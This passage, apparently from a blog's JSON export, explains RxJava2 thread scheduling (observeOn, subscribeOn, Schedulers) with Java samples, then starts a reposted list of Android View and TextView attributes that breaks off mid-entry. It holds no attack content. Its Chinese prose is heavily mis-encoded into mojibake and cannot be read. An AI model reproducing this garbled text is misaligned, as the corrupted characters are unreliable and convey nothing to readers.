æ•´ç†ä¸€ä¸‹ï¼Œä¸Šæ¸¸çš„Observableå‘å‡ºOnNextçš„æ—¶å€™ï¼ŒObserveOnObserverå¼€å§‹schedule,ä¹Ÿå°±æ˜¯é€šè¿‡worker.scheduleå°†ä»»åŠ¡è°ƒåº¦åˆ°æ–°çš„çº¿ç¨‹ã€‚æ–°çš„çº¿ç¨‹è¿è¡Œrunæ–¹æ³•ä¸­forå¾ªç¯ä»queueä¸­æŸ¥æ‰¾resultã€‚ObserveOnObserverå°±æ˜¯åœ¨onNextä¸­æ¥æ”¶åˆ°ä¸Šæ¸¸æ•°æ®ï¼Œå­˜åˆ°queueé‡Œé¢ä¹‹åï¼Œè°ƒåº¦å¦ä¸€æ¡çº¿ç¨‹å»è·‘ä¸€ä¸ªrunæ–¹æ³•ï¼Œè¯¥æ–¹æ³•ä¼šå»drainè¿™ä¸ªqueueï¼Œä¹Ÿå°±æ˜¯å–å‡ºåˆšæ‰æ”¾è¿›å»çš„æ•°æ® SubscribeOnä¹Ÿæ˜¯ç±»ä¼¼çš„é“ç†SubscribeOnè¿”å›äº†ä¸€ä¸ªObservableSubscribeOnå®ä¾‹ObservableSubscribeOn @Override public void subscribeActual(final Observer&lt;? super T&gt; s) { final SubscribeOnObserver&lt;T&gt; parent = new SubscribeOnObserver&lt;T&gt;(s); s.onSubscribe(parent); parent.setDisposable(scheduler.scheduleDirect(new SubscribeTask(parent))); //scheduleDirectå°±æ˜¯æŠŠtaskä¸¢åˆ°schedulerçš„çº¿ç¨‹ } é¡ºä¾¿æä¸€ä¸‹io.reactivex.schedulers.Schedulerså…¸å‹çš„çº¿ç¨‹å®‰å…¨å•ä¾‹æ¨¡å¼ static final class SingleHolder { static final Scheduler DEFAULT = new SingleScheduler(); } static final class ComputationHolder { static final Scheduler DEFAULT = new ComputationScheduler(); } static final class IoHolder { static final Scheduler DEFAULT = new IoScheduler(); } static final class NewThreadHolder { static final Scheduler DEFAULT = new NewThreadScheduler(); } è¿™äº›Scheduleréƒ½ç»§æ‰¿Schedulerè¿™ä¸ªabstract class @NonNull public abstract Worker createWorker(); Schedulers.io() â€”&gt; io.reactivex.internal.schedulers.IoScheduler //å°½é‡cache,å¿™ä¸è¿‡æ¥çš„è¯åˆ›å»ºæ–°çš„çº¿ç¨‹Schedulers.computation() io.reactivex.internal.schedulers.ComputationScheduler //åªæ˜¯ç»´æŒäº†cpuæ ¸å¿ƒæ•°ä»¥å†…çš„çº¿ç¨‹ï¼Œæœ‰ä»»åŠ¡æ¥çš„æ—¶å€™round-robin /** * Holds a fixed pool of worker threads and assigns them * to requested Scheduler.Workers in a round-robin fashion. */ public final class ComputationScheduler extends Scheduler implements SchedulerMultiWorkerSupport { private static final String THREAD_NAME_PREFIX = &quot;RxComputationThreadPool&quot;; //è¿™ä¸ªç†Ÿæ‚‰çš„å­—çœ¼ @NonNull @Override public Worker createWorker() { return new EventLoopWorker(pool.get().getEventLoop()); } } /** * Scheduler that creates and caches a set of thread pools and reuses them if possible. */ public final class IoScheduler extends Scheduler { @NonNull @Override public Worker createWorker() { return new EventLoopWorker(pool.get()); } } //EventLoopWorkerå®é™…ä¸Šä»£ç†äº†PoolWorkerï¼ˆç»§æ‰¿NewThreadWorkerï¼‰çš„å·¥ä½œ public class NewThreadWorker extends Scheduler.Worker implements Disposable { private final ScheduledExecutorService executor; //æœ‰ä¸€ä¸ªscheduleAtFixedRateçš„åŠŸèƒ½å¯ä»¥æ‹¿æ¥åšå®šæ—¶ä»»åŠ¡ volatile boolean disposed; public NewThreadWorker(ThreadFactory threadFactory) { executor = SchedulerPoolFactory.create(threadFactory); } } ä¸ºä»€ä¹ˆå¤šä¸ªsubscribeOnæ²¡æœ‰åµç”¨å°±æ˜¯ä¸‹é¢è¿™ç§ Observable.just(1) .map(new Function&lt;Integer, Integer&gt;() { @Override public Integer apply(@NonNull Integer integer) throws Exception { Log.i(TAG, &quot;map-1:&quot;+Thread.currentThread().getName()); //å®é™…è¿è¡Œåœ¨RxNewThreadScheduler-1ä¸Š return integer; } }) .subscribeOn(Schedulers.newThread()) .map(new Function&lt;Integer, Integer&gt;() { @Override public Integer apply(@NonNull Integer integer) throws Exception { Log.i(TAG, &quot;map-2:&quot;+Thread.currentThread().getName());//å®é™…è¿è¡Œåœ¨RxNewThreadScheduler-1ä¸Š return integer; } }) .subscribeOn(Schedulers.io()) .map(new Function&lt;Integer, Integer&gt;() { @Override public Integer apply(@NonNull Integer integer) throws Exception { Log.i(TAG, &quot;map-3:&quot;+Thread.currentThread().getName());//å®é™…è¿è¡Œåœ¨RxNewThreadScheduler-1ä¸Š return integer; } }) .subscribeOn(AndroidSchedulers.mainThread()) .subscribe(new Consumer&lt;Integer&gt;() { @Override public void accept(@NonNull Integer integer) throws Exception { Log.i(TAG, &quot;subscribe:&quot;+Thread.currentThread().getName());//å®é™…è¿è¡Œåœ¨RxNewThreadScheduler-1ä¸Š } }); å®˜æ–¹æ–‡æ¡£è¿™ä¹ˆè¯´çš„ï¼š the SubscribeOn operator designates which thread the Observable will begin operating on, no matter at what point in the chain of operators that operator is called. ObserveOn, on the other hand, affects the thread that the Observable will use below where that operator appears. For this reason, you may call ObserveOn multiple times at various points during the chain of Observable operators in order to change on which threads certain of those operators operate. subScribeOnè¿”å›çš„æ˜¯ObservableSubscribeOnå®ƒçš„subscribeActualé‡Œé¢ä¸»è¦åšäº†è¿™ä»¶äº‹ scheduler.scheduleDirect(new SubscribeTask(parent)) //parentæ˜¯è‡ªå·±åŒ…è£…çš„ä¸€ä¸ªObserver,SubscribeTaskçš„runæ–¹æ³•å°±æ˜¯upstream.subScribe(parent)ï¼Œå¤§è‡´å¦‚æ­¤ ObservableSubscribeOn.subScribeä¼šè°ƒç”¨åˆ°ObservableSubscribeOn.subscribeActual â€”&gt; è°ƒæ¥è°ƒå»å›åˆ°SubscribeTask çš„ run()ï¼Œå®ƒåˆå¼€å§‹å¾€ä¸Šå»è®¢é˜…(subScribeActual)ï¼Œå¦‚æ­¤å¾ªç¯åˆ°ç¬¬ä¸€ä¸ªä½ç½® ä¸Šå±‚äº‹ä»¶å‘ç”Ÿæ—¶ï¼Œä¼šä¸€æ­¥æ­¥åœ°è°ƒç”¨actual.onNext -&gt; actual.onNextâ€¦è¿™äº›actualçš„è¿æ¥éƒ½æ˜¯åœ¨ä¸Šé¢å‡ ä¸ªä¸åŒçš„çº¿ç¨‹ä¸­è¿æ¥ä¸Šçš„ã€‚åªæ˜¯äº‹ä»¶å‘ç”Ÿæ—¶ï¼Œæ²¡æœ‰èµ°çº¿ç¨‹è°ƒåº¦ï¼Œç›´æ¥ä»ç¬¬ä¸€ä¸ªschedulerçš„çº¿ç¨‹å¼€å§‹è¿è¡Œè¿™æ®µé“¾æ¡çŠ¶çš„onNextè°ƒç”¨ï¼Œæ‰€ä»¥ä¹Ÿå°±åªæœ‰ç¬¬ä¸€æ¬¡subScribeOnæœ‰ç”¨äº† Referenceâ€“ GOTO 2016 â€¢ Exploring RxJava 2 for Android â€¢ Jake Wharton - YouTubeâ€“ æ˜é‡‘â€“ ä½¿ç”¨concatä»æ•°æ®åº“ï¼Œå†…å­˜ï¼Œç½‘ç»œä¸‰å±‚ä¸­è·å–æ•°æ®â€“ RxJava æ•™ç¨‹ç¬¬å››éƒ¨åˆ†ï¼šå¹¶å‘ ä¹‹æ•°æ®æµå‘å°„å¤ªå¿«å¦‚ä½•åŠ rxjava2æ“ä½œç¬¦è¯¦è§£","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"},{"name":"rxjava2","slug":"rxjava2","permalink":"https://haldir65.github.io/tags/rxjava2/"}]},{"title":"Viewçš„å±æ€§å¤§å…¨[è½¬è½½]","date":"2017-04-03T11:38:10.000Z","path":"2017/04/03/2017-04-03-properties-of-view/","text":"è½¬è‡ªAndroidå±æ€§å¤§å…¨ android:alpha setAlpha(float) å±æ€§è¯´æ˜: è§†å›¾é€æ˜åº¦ï¼Œå€¼åœ¨0-1ä¹‹é—´ã€‚0ä¸ºå®Œå…¨é€æ˜ï¼Œ1ä¸ºå®Œå…¨ä¸é€æ˜ã€‚ android:background setBackgroundResource(int) å±æ€§è¯´æ˜: è§†å›¾èƒŒæ™¯ android:clickable setClickable(boolean) å±æ€§è¯´æ˜: è§†å›¾æ˜¯å¦å¯ç‚¹å‡» android:contentDescription setContentDescription(CharSequence) å±æ€§è¯´æ˜: è®¾ç½®Viewçš„å¤‡æ³¨è¯´æ˜ï¼Œä½œä¸ºä¸€ç§è¾…åŠ©åŠŸèƒ½æä¾›,ä¸ºä¸€äº›æ²¡æœ‰æ–‡å­—æè¿°çš„Viewæä¾›è¯´æ˜ android:drawingCacheQuality setDrawingCacheQuality(int) å±æ€§è¯´æ˜: &quot;è®¾ç½®ç»˜å›¾æ—¶åŠé€æ˜è´¨é‡ã€‚æœ‰å¯ä»¥å–ä»¥ä¸‹3ä¸ªå€¼ autoâ€”â€”é»˜è®¤ï¼Œç”±æ¡†æ¶å†³å®š highâ€”â€”é«˜è´¨é‡ï¼Œä½¿ç”¨è¾ƒé«˜çš„é¢œè‰²æ·±åº¦ï¼Œæ¶ˆè€—æ›´å¤šçš„å†…å­˜ lowâ€”â€”ä½è´¨é‡ï¼Œä½¿ç”¨è¾ƒä½çš„é¢œè‰²æ·±åº¦ï¼Œä½†æ˜¯ç”¨æ›´å°‘çš„å†…å­˜&quot; android:duplicateParentState å±æ€§è¯´æ˜: å¦‚æœè®¾ç½®æ­¤å±æ€§ï¼Œå°†ç›´æ¥ä»çˆ¶å®¹å™¨ä¸­è·å–ç»˜å›¾çŠ¶æ€ï¼ˆå…‰æ ‡ï¼ŒæŒ‰ä¸‹ç­‰ï¼‰ android:fadeScrollbars setScrollbarFadingEnabled(boolean) å±æ€§è¯´æ˜: å®šä¹‰åœ¨ScrollBaræ²¡æœ‰ä½¿ç”¨æ—¶ï¼Œæ˜¯å¦è¤ªè‰²ã€‚ android:fadingEdgeLength getVerticalFadingEdgeLength() å±æ€§è¯´æ˜: è®¾ç½®è¾¹æ¡†æ¸å˜çš„é•¿åº¦ã€‚ android:filterTouchesWhenObscured setFilterTouchesWhenObscured(boolean) å±æ€§è¯´æ˜: viewæ‰€åœ¨çª—å£è¢«å…¶å®ƒå¯è§çª—å£é®ä½æ—¶ï¼Œæ˜¯å¦è¿‡æ»¤è§¦æ‘¸äº‹ä»¶ã€‚ android:fitsSystemWindows setFitsSystemWindows(boolean) å±æ€§è¯´æ˜: è®¾ç½®å¸ƒå±€è°ƒæ•´æ—¶æ˜¯å¦è€ƒè™‘ç³»ç»Ÿçª—å£ï¼ˆå¦‚çŠ¶æ€æ ï¼‰ android:focusable setFocusable(boolean) å±æ€§è¯´æ˜: è®¾ç½®æ˜¯å¦è·å¾—ç„¦ç‚¹ã€‚è‹¥æœ‰requestFocus()è¢«è°ƒç”¨æ—¶ï¼Œåè€…ä¼˜å…ˆå¤„ç†ã€‚æ³¨æ„åœ¨è¡¨å•ä¸­æƒ³è®¾ç½®æŸä¸€ä¸ªå¦‚EditTextè·å–ç„¦ç‚¹ï¼Œå…‰è®¾ç½®è¿™ä¸ªæ˜¯ä¸è¡Œçš„ï¼Œéœ€è¦å°†è¿™ä¸ªEditTextå‰é¢çš„focusableéƒ½è®¾ç½®ä¸ºfalseæ‰è¡Œã€‚åœ¨Touchæ¨¡å¼ä¸‹è·å–ç„¦ç‚¹éœ€è¦è®¾ç½®focusableInTouchModeä¸ºtrueã€‚ android:focusableInTouchMode setFocusableInTouchMode(boolean) å±æ€§è¯´æ˜: è®¾ç½®åœ¨Touchæ¨¡å¼ä¸‹Viewæ˜¯å¦èƒ½å–å¾—ç„¦ç‚¹ã€‚ android:hapticFeedbackEnabled setHapticFeedbackEnabled(boolean) å±æ€§è¯´æ˜: æ˜¯å¦å¯ç”¨è§¦æ‘¸åé¦ˆï¼Œå¯ç”¨åå°±æ˜¯åœ¨ç‚¹å‡»ç­‰æ“ä½œæ—¶ä¼šæœ‰éœ‡åŠ¨ç­‰åé¦ˆæ•ˆæœ android:id setId(int) å±æ€§è¯´æ˜: ç»™å½“å‰Viewè®¾ç½®ä¸€ä¸ªåœ¨å½“å‰layout.xmlä¸­çš„å”¯ä¸€ç¼–å·ï¼Œå¯ä»¥é€šè¿‡è°ƒç”¨View.findViewById() æˆ–Activity.findViewById()æ ¹æ®è¿™ä¸ªç¼–å·æŸ¥æ‰¾åˆ°å¯¹åº”çš„Viewã€‚ä¸åŒçš„layout.xmlä¹‹é—´å®šä¹‰ç›¸åŒçš„idä¸ä¼šå†²çªã€‚ android:importantForAccessibility setImportantForAccessibility(int) å±æ€§è¯´æ˜: è®¾ç½®å¯è¾¾æ€§çš„é‡è¦æ€§ android:isScrollContainer setScrollContainer(boolean) å±æ€§è¯´æ˜: è®¾ç½®å½“å‰Viewä¸ºæ»šåŠ¨å®¹å™¨ã€‚è¿™é‡Œæ²¡æœ‰æµ‹è¯•å‡ºæ•ˆæœæ¥ï¼ŒListView/ GridView/ ScrollViewæ ¹æœ¬å°±ä¸ç”¨è®¾ç½®è¿™ä¸ªå±æ€§ï¼Œè€ŒEdidTextè®¾ç½®android:scrollbarsä¹Ÿèƒ½å‡ºæ»šåŠ¨æ¡ android:keepScreenOn setKeepScreenOn(boolean) å±æ€§è¯´æ˜: è§†å›¾åœ¨å¯è§çš„æƒ…å†µä¸‹æ˜¯å¦ä¿æŒå”¤é†’çŠ¶æ€ã€‚ android:layerType setLayerType(int,Paint) å±æ€§è¯´æ˜: &quot;è®¾ç½®æŒ‡å®šå±‚çš„ç±»å‹ï¼Œå¯ä»¥å–ä»¥ä¸‹3ä¸ªå€¼ï¼š noneâ€”â€”ä¸æŒ‡å®š softwareâ€”â€”è½¯ä»¶å±‚ã€‚ hardwareâ€”â€”ç¡¬ä»¶å±‚ã€‚ä½¿ç”¨ç¡¬ä»¶åŠ é€Ÿã€‚&quot; android:layoutDirection setLayoutDirection(int) å±æ€§è¯´æ˜: å®šä¹‰å¸ƒå±€å›¾çº¸çš„æ–¹å‘ android:longClickable setLongClickable(boolean) å±æ€§è¯´æ˜: æ˜¯å¦å“åº”é•¿ç‚¹å‡»äº‹ä»¶ android:minHeight setMinimumHeight(int) å±æ€§è¯´æ˜: è®¾ç½®è§†å›¾æœ€å°é«˜åº¦ android:minWidth setMinimumWidth(int) å±æ€§è¯´æ˜: è®¾ç½®è§†å›¾æœ€å°å®½åº¦ android:nextFocusDown setNextFocusDownId(int) å±æ€§è¯´æ˜: å‘ä¸‹ç§»åŠ¨ç„¦ç‚¹æ—¶ï¼Œä¸‹ä¸€ä¸ªè·å–ç„¦ç‚¹çš„viewçš„id android:nextFocusForward setNextFocusForwardId(int) å±æ€§è¯´æ˜: ä¸‹ä¸€ä¸ªè·å–ç„¦ç‚¹çš„viewçš„id android:nextFocusLeft setNextFocusLeftId(int) å±æ€§è¯´æ˜: å‘å·¦ç§»åŠ¨ç„¦ç‚¹æ—¶ï¼Œä¸‹ä¸€ä¸ªè·å–ç„¦ç‚¹çš„viewçš„id android:nextFocusRight setNextFocusRightId(int) å±æ€§è¯´æ˜: å‘å³ç§»åŠ¨ç„¦ç‚¹æ—¶ï¼Œä¸‹ä¸€ä¸ªè·å–ç„¦ç‚¹çš„viewçš„id android:nextFocusUp setNextFocusUpId(int) å±æ€§è¯´æ˜: å‘ä¸Šç§»åŠ¨ç„¦ç‚¹æ—¶ï¼Œä¸‹ä¸€ä¸ªè·å–ç„¦ç‚¹çš„viewçš„id android:onClick setOnClick()æˆ– onClick(View view)å±æ€§è¯´æ˜: ç‚¹å‡»æ—¶ï¼Œè¦è°ƒç”¨çš„æ–¹æ³•çš„åç§°ã€‚ android:padding setPaddingRelative(int,int,int,int) å±æ€§è¯´æ˜: è®¾ç½®ä¸Šä¸‹å·¦å³çš„è¾¹è· android:paddingBottom setPaddingRelative(int,int,int,int) å±æ€§è¯´æ˜: ä¸‹è¾¹è· android:paddingEnd setPaddingRelative(int,int,int,int) å±æ€§è¯´æ˜: ä¸android:paddingRightç›¸åŒ android:paddingLeft setPadding(int,int,int,int) å±æ€§è¯´æ˜: å·¦è¾¹è· android:paddingRight setPadding(int,int,int,int) å±æ€§è¯´æ˜: å³è¾¹è· android:paddingStart setPaddingRelative(int,int,int,int) å±æ€§è¯´æ˜: android:paddingLeftç›¸åŒ android:paddingTop setPaddingRelative(int,int,int,int) å±æ€§è¯´æ˜: ä¸Šè¾¹è· android:requiresFadingEdge setVerticalFadingEdgeEnabled(boolean) å±æ€§è¯´æ˜: å®šä¹‰æ»šåŠ¨æ—¶è¾¹ç¼˜æ˜¯å¦è¤ªè‰² android:rotation setRotation(float) å±æ€§è¯´æ˜: æ—‹è½¬åº¦æ•° android:rotationX setRotationX(float) å±æ€§è¯´æ˜: æ°´å¹³æ—‹è½¬åº¦æ•° android:rotationY setRotationY(float) å±æ€§è¯´æ˜: ç«–ç›´æ—‹è½¬åº¦æ•° android:saveEnabled setSaveEnabled(boolean) å±æ€§è¯´æ˜: åœ¨é…ç½®æ”¹å˜ç­‰æƒ…å†µå‡ºç°æ—¶æ˜¯å¦ä¿å­˜viewçš„çŠ¶æ€æ•°æ®ã€‚å¦‚æœä½ çš„viewæœ‰idï¼Œé‚£é»˜è®¤ç³»ç»Ÿå°±ä¼šå¸®ä½ ä¿å­˜ã€‚ android:scaleX setScaleX(float) å±æ€§è¯´æ˜: æ°´å¹³æ–¹å‘ç¼©æ”¾æ¯”ä¾‹ android:scaleY setScaleY(float) å±æ€§è¯´æ˜: ç«–ç›´æ–¹å‘ç¼©æ”¾æ¯”ä¾‹ android:scrollX å±æ€§è¯´æ˜: xæ–¹å‘çš„æ»šåŠ¨åç§»ã€‚å³åœ¨æ°´å¹³æ–¹å‘æ»šåŠ¨äº†å¤šå°‘è·ç¦» android:scrollY å±æ€§è¯´æ˜: yæ–¹å‘çš„æ»šåŠ¨åç§»ã€‚å³åœ¨ç«–ç›´æ–¹å‘æ»šåŠ¨äº†å¤šå°‘è·ç¦» android:scrollbarAlwaysDrawHorizontalTrack å±æ€§è¯´æ˜: æ˜¯å¦æ€»æ˜¯ç»˜åˆ¶æ°´å¹³æ»šåŠ¨æ¡çš„æ»šåŠ¨è½¨é“ android:scrollbarAlwaysDrawVerticalTrack å±æ€§è¯´æ˜: æ˜¯å¦æ€»æ˜¯ç»˜åˆ¶ç«–ç›´æ»šåŠ¨æ¡çš„æ»šåŠ¨è½¨é“ android:scrollbarDefaultDelayBeforeFade setScrollBarDefaultDelayBeforeFade(int) å±æ€§è¯´æ˜: æ»šåŠ¨æ¡åœ¨næ¯«ç§’åå¼€å§‹æ·¡å‡ºã€‚ android:scrollbarFadeDuration setScrollBarFadeDuration(int) å±æ€§è¯´æ˜: æ»šåŠ¨æ¡ç”¨å¤šé•¿æ—¶é—´æ·¡å‡ºå®Œæ¯•ã€‚ android:scrollbarSize setScrollBarSize(int) å±æ€§è¯´æ˜: è®¾ç½®æ»šåŠ¨æ¡çš„å°ºå¯¸ã€‚å‚ç›´æ»šåŠ¨æ¡çš„å®½åº¦ã€æ°´å¹³æ»šåŠ¨æ¡çš„é«˜åº¦ android:scrollbarStyle setScrollBarStyle(int) å±æ€§è¯´æ˜: &quot;æ»šåŠ¨æ¡çš„é£æ ¼ã€‚å…±4ç»„å€¼ï¼š insideOverlayâ€”â€”å†…è´´å›¾ insideInsetâ€”â€”å†…æ’å›¾ outsideOverlayâ€”â€”å¤–è´´å›¾ outsideInsetâ€”â€”å¤–æ’å›¾ã€‚ insideå°±æ˜¯æ»šåŠ¨æ¡åœ¨ç»˜åˆ¶åœ¨paddingä»¥å†…ï¼›outsideå°±æ˜¯ä¸éœ€è¦ç»˜åˆ¶åœ¨paddingå†…ï¼ˆå³viewçš„è¾¹ç•Œå¤„ï¼‰ï¼›Overlayæ˜¯è´´å›¾ï¼Œå°±æ˜¯ç›´æ¥è¦†ç›–åœ¨å†…å®¹çš„ä¸Šæ–¹ï¼Œè¿™æ ·å†…å®¹å¯èƒ½ä¼šæ˜¾ç¤ºåˆ°æ»šåŠ¨æ¡ä¸‹æ–¹å»ï¼›Insetæ˜¯æ’å›¾ï¼Œå°±æ˜¯ä¼šåœ¨å¯¹åº”paddingä¸ŠåŠ ä¸Šæ»šåŠ¨æ¡çš„å®½åº¦ï¼Œä»¥ä¸è®©å†…å®¹æ˜¾ç¤ºåˆ°æ»šåŠ¨æ¡ä¸‹é¢å»ã€‚&quot; android:scrollbarThumbHorizontal å±æ€§è¯´æ˜: æ°´å¹³æ»šåŠ¨å—çš„drawableå¯¹è±¡ android:scrollbarThumbVertical å±æ€§è¯´æ˜: ç«–ç›´æ»šåŠ¨å—çš„drawableå¯¹è±¡ android:scrollbarTrackHorizontal å±æ€§è¯´æ˜: æ°´å¹³æ»šåŠ¨æ¡æ»šåŠ¨è½¨é“çš„drawableå¯¹è±¡ android:scrollbarTrackVertical å±æ€§è¯´æ˜: ç«–ç›´æ»šåŠ¨æ¡æ»šåŠ¨è½¨é“çš„drawableå¯¹è±¡ android:scrollbars å±æ€§è¯´æ˜: &quot;è®¾ç½®å¯æ˜¾ç¤ºçš„æ»šåŠ¨æ¡ã€‚æœ‰3ä¸ªå–å€¼: noneâ€”â€”ä¸æ˜¾ç¤ºæ»šåŠ¨æ¡ horizontalâ€”â€”æ˜¾ç¤ºæ°´å¹³æ»šåŠ¨æ¡ verticalâ€”â€”æ˜¾ç¤ºç«–ç›´æ»šåŠ¨æ¡&quot; android:soundEffectsEnabled setSoundEffectsEnabled(boolean) å±æ€§è¯´æ˜: ç‚¹å‡»æˆ–è§¦æ‘¸è¯¥viewæ—¶ï¼Œæ˜¯å¦éœ€è¦æœ‰å£°éŸ³æ•ˆæœ android:tag å±æ€§è¯´æ˜: stringæ ‡è¯†ã€‚ç±»ä¼¼idï¼Œidæ˜¯æ•´æ•°æ ‡è¯†ã€‚ android:textAlignment setTextAlignment(int) å±æ€§è¯´æ˜: è®¾ç½®æ–‡æœ¬çš„æ˜¾ç¤ºæ–¹å¼ã€‚ android:textDirection setTextDirection(int) å±æ€§è¯´æ˜: è®¾ç½®æ–‡æœ¬çš„æ˜¾ç¤ºæ–¹å‘ã€‚ android:transformPivotX setPivotX(float) å±æ€§è¯´æ˜: æ°´å¹³æ–¹å‘åè½¬é‡ android:transformPivotY setPivotY(float) å±æ€§è¯´æ˜: ç«–ç›´æ–¹å‘åè½¬é‡ android:translationX setTranslationX(float) å±æ€§è¯´æ˜: æ°´å¹³æ–¹å‘çš„ç§»åŠ¨è·ç¦» android:translationY setTranslationY(float) å±æ€§è¯´æ˜: ç«–ç›´æ–¹å‘çš„ç§»åŠ¨è·ç¦» android:visibility setVisibility(int) å±æ€§è¯´æ˜: &quot;viewçš„å¯è§æ€§ã€‚æœ‰3ä¸ªå–å€¼ï¼š goneâ€”â€”ä¸å¯è§ï¼ŒåŒæ—¶ä¸å ç”¨viewçš„ç©ºé—´ï¼› invisibleâ€”â€”ä¸å¯è§ï¼Œä½†å ç”¨viewçš„ç©ºé—´ï¼› visibleâ€”â€”å¯è§&quot; TextViewå±æ€§è¯´æ˜ ä¸‹é¢å¯¹TextViewçš„å±æ€§è¿›è¡Œè¯´æ˜ android:autoLink setAutoLinkMask(int) å±æ€§è¯´æ˜: è®¾ç½®æ˜¯å¦â€œå½“æ–‡æœ¬ä¸ºURLé“¾æ¥/email/ç”µè¯å·ç /mapæ—¶ï¼Œæ–‡æœ¬æ˜¾ç¤ºä¸ºå¯ç‚¹å‡»çš„é“¾æ¥â€ã€‚å¯é€‰å€¼(none/web/email/phone/map/all) android:autoText setKeyListener(KeyListener) å±æ€§è¯´æ˜: å¦‚æœè®¾ç½®ï¼Œå°†è‡ªåŠ¨æ‰§è¡Œè¾“å…¥å€¼çš„æ‹¼å†™çº æ­£ã€‚æ­¤å¤„æ— æ•ˆæœï¼Œåœ¨æ˜¾ç¤ºè¾“å…¥æ³•å¹¶è¾“å…¥çš„æ—¶å€™èµ·ä½œç”¨ã€‚ android:bufferType setText(CharSequence,TextView.BufferType) å±æ€§è¯´æ˜: æŒ‡å®šgetText()æ–¹å¼å–å¾—çš„æ–‡æœ¬ç±»åˆ«ã€‚é€‰é¡¹editable ç±»ä¼¼äºStringBuilderå¯è¿½åŠ å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯è¯´getTextåå¯è°ƒç”¨appendæ–¹æ³•è®¾ç½®æ–‡æœ¬å†…å®¹ã€‚ android:capitalize setKeyListener(KeyListener) å±æ€§è¯´æ˜: è®¾ç½®è‡ªåŠ¨å¤§å†™å±æ€§ã€‚æ¯”å¦‚è®¾ç½®ä¸º2ï¼Œè‡ªåŠ¨å¤§å†™å•è¯é¦–å­—ç¬¦ï¼›è®¾ç½®ä¸º1ï¼Œè‡ªåŠ¨å¤§å†™æ¯å¥è¯çš„é¦–å­—æ¯ç­‰ç­‰ã€‚ android:cursorVisible setCursorVisible(boolean) å±æ€§è¯´æ˜: è®¾å®šå…‰æ ‡ä¸ºæ˜¾ç¤º/éšè—ï¼Œé»˜è®¤æ˜¾ç¤ºã€‚ android:digits setKeyListener(KeyListener) å±æ€§è¯´æ˜: è®¾ç½®å…è®¸è¾“å…¥å“ªäº›å­—ç¬¦ã€‚å¦‚â€œ1234567890.+-*/%\\n()â€ android:drawableBottom setCompoundDrawablesWithIntrinsicBounds(int,int,int,int) å±æ€§è¯´æ˜: åœ¨textçš„ä¸‹æ–¹è¾“å‡ºä¸€ä¸ªdrawableã€‚å¦‚æœæŒ‡å®šä¸€ä¸ªé¢œè‰²çš„è¯ä¼šæŠŠtextçš„èƒŒæ™¯è®¾ä¸ºè¯¥é¢œè‰²ï¼Œå¹¶ä¸”åŒæ—¶å’Œbackgroundä½¿ç”¨æ—¶è¦†ç›–åè€…ã€‚ android:drawableEnd setCompoundDrawablesRelativeWithIntrinsicBounds(int,int,int,int) å±æ€§è¯´æ˜: åœ¨æ–‡æœ¬ç»“å°¾å¤„æ˜¾ç¤ºdrawableå¯¹è±¡ã€‚å®ƒçš„å€¼å¯ä»¥æ˜¯å…¶å®ƒèµ„æºçš„å¼•ç”¨ï¼Œæ¯”å¦‚ï¼Œ&quot;@[+][package:]type:name&quot;æˆ–è€…&quot;?[package:][type:]name&quot;ï¼›ä¹Ÿå¯ä»¥æ˜¯é¢œè‰²å€¼ï¼Œå¦‚&quot;#rgb&quot;, &quot;#argb&quot;, &quot;#rrggbb&quot;, or &quot;#aarrggbb&quot;ã€‚ android:drawableLeft setCompoundDrawablesWithIntrinsicBounds(int,int,int,int) å±æ€§è¯´æ˜: åœ¨textçš„å·¦è¾¹è¾“å‡ºä¸€ä¸ªdrawableã€‚ android:drawablePadding setCompoundDrawablePadding(int) å±æ€§è¯´æ˜: è®¾ç½®textä¸drawableçš„é—´éš”ï¼Œä¸drawableLeftã€drawableRightã€drawableTopã€drawableBottomä¸€èµ·ä½¿ç”¨ï¼Œå¯è®¾ç½®ä¸ºè´Ÿæ•°ï¼Œå•ç‹¬ä½¿ç”¨æ²¡æœ‰æ•ˆæœã€‚ android:drawableRight setCompoundDrawablesWithIntrinsicBounds(int,int,int,int) å±æ€§è¯´æ˜: åœ¨textçš„å³è¾¹è¾“å‡ºä¸€ä¸ªdrawableã€‚ android:drawableStart setCompoundDrawablesRelativeWithIntrinsicBounds(int,int,int,int) å±æ€§è¯´æ˜: åœ¨æ–‡æœ¬å¼€å§‹å¤„æ˜¾ç¤ºdrawableå¯¹è±¡ã€‚å®ƒçš„å€¼å¯ä»¥æ˜¯å…¶å®ƒèµ„æºçš„å¼•ç”¨ï¼Œæ¯”å¦‚ï¼Œ&quot;@[+][package:]type:name&quot;æˆ–è€…&quot;?[package:][type:]name&quot;ï¼›ä¹Ÿå¯ä»¥æ˜¯é¢œè‰²å€¼ï¼Œå¦‚&quot;#rgb&quot;, &quot;#argb&quot;, &quot;#rrggbb&quot;, or &quot;#aarrggbb&quot;ã€‚ android:drawableTop setCompoundDrawablesWithIntrinsicBounds(int,int,int,int) å±æ€§è¯´æ˜: åœ¨textçš„æ­£ä¸Šæ–¹è¾“å‡ºä¸€ä¸ªdrawableã€‚ android:editable å±æ€§è¯´æ˜: è®¾ç½®æ˜¯å¦å¯ç¼–è¾‘ã€‚è¿™é‡Œæ— æ•ˆæœï¼Œåœ¨EditViewä¸­æ‰æœ‰æ•ˆæœã€‚ android:editorExtras setInputExtras(int) å±æ€§è¯´æ˜: è®¾ç½®æ–‡æœ¬çš„é¢å¤–çš„è¾“å…¥æ•°æ®ã€‚åœ¨EditViewä¸­æ‰æœ‰æ•ˆæœã€‚ android:ellipsize setEllipsize(TextUtils.TruncateAt) å±æ€§è¯´æ˜: è®¾ç½®å½“æ–‡å­—è¿‡é•¿æ—¶,è¯¥æ§ä»¶è¯¥å¦‚ä½•æ˜¾ç¤ºã€‚æœ‰å¦‚ä¸‹å€¼è®¾ç½®ï¼šâ€startâ€â€”â€“çœç•¥å·æ˜¾ç¤ºåœ¨å¼€å¤´ï¼›â€endâ€â€”â€”çœç•¥å·æ˜¾ç¤ºåœ¨ç»“å°¾ï¼›â€middleâ€â€”-çœç•¥å·æ˜¾ç¤ºåœ¨ä¸­é—´ï¼›â€marqueeâ€ â€”â€”ä»¥è·‘é©¬ç¯çš„æ–¹å¼æ˜¾ç¤º(åŠ¨ç”»æ¨ªå‘ç§»åŠ¨) android:ems setEms(int) å±æ€§è¯´æ˜: è®¾ç½®TextViewçš„å®½åº¦ä¸ºNä¸ªå­—ç¬¦çš„å®½åº¦ã€‚ android:fontFamily setTypeface(Typeface) å±æ€§è¯´æ˜: 